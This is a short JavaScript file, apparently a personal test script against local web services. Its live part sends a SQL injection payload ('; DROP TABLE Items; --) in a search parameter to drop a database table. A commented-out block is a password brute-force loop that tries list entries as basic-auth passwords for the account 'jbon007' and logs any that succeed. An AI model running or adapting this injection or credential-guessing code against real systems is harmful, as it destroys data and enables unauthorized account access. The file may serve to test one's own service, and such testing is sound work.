console.log("run");
fetch(
  `http://localhost:8188/DairyService.svc/search?term='; DROP TABLE Items; --`,
  {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
    },
  }
).then(console.log("done"));
//*/
//using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM Items WHERE Id = @id"))

/*
list = ["q"];
//list = ["a", "b", "jbon007passwd"];
breakB = false;
console.log("here");
var count = 0;
var failed = true;
list.forEach((element) => {
  count++;
  if (!(count % 100)) {
    setTimeout(() => {}, 20000);
  }
  while (failed) {
    var xhr = new XMLHttpRequest();
    xhr.open(
      "GET",
      `http://localhost:8189/Service.svc/id`,
      true,
      "jbon007",
      element
    );
    xhr.withCredentials = true;
    xhr.addEventListener("readystatechange", function () {
      if (this.readyState === 4) {
        console.log(this.responseText);
        if (this.responseText.includes("Fault ")) {
          console.error(".");
          failed = false;
        } else if (this.responseText.includes(" ")) {
          document.getElementById("works").innerHTML += `<br>${element}<br>`;
          console.log(this.responseText);
          breakB = true;
          failed = false;
        } else {
          failed = true;
        }
      }
    });
    xhr.send();
    setTimeout(() => {}, 1000);
  }
  //console.log(xhr.status);
});
//*/
